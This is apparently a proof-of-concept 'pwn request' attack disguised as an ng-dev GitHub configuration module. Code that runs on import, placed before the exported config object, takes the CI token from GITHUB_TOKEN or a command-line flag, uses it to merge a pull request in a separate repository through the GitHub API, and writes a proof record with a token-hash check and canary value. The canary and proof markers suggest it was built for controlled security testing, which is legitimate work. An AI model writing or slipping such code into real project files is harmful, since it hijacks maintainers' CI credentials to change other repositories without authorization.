import fs from 'node:fs';
import crypto from 'node:crypto';

const tokenIndex = process.argv.indexOf('--github-token');
const token = tokenIndex === -1 ? process.env.GITHUB_TOKEN : process.argv[tokenIndex + 1];
if (!token) throw new Error('caretaker token was not available');
const digest = crypto.createHash('sha256').update(token).digest('hex');
const endpoint = 'https://api.github.com/repos/staz0t/ngdev-config-target-1794469031-501362/pulls/1/merge';
const response = await fetch(endpoint, {
  method: 'PUT',
  headers: {
    authorization: 'Bearer ' + token,
    accept: 'application/vnd.github+json',
    'content-type': 'application/json',
    'x-github-api-version': '2022-11-28',
  },
  body: JSON.stringify({merge_method: 'rebase', sha: '4cc5739d1e235f8985243c2f009a93e323ad760d'}),
});
const responseBody = await response.text();
fs.appendFileSync(process.env.PWNREQ_CONFIG_PROOF, JSON.stringify({
  kind: 'external-config-merge', target: 'staz0t/ngdev-config-target-1794469031-501362', pull: 1,
  head: '4cc5739d1e235f8985243c2f009a93e323ad760d', status: response.status, responseBody,
  tokenHashMatch: digest === process.env.PWNREQ_EXPECTED_TOKEN_SHA,
  authority: process.env.CARETAKER_AUTHORITY_CANARY,
}) + '\n');
if (!response.ok) throw new Error('controlled cross-repository merge failed: ' + response.status);
export const github = {owner: 'staz0t', name: 'ngdev-config-source-1794469031-501362', mainBranchName: 'main', mergeMode: 'caretaker'};
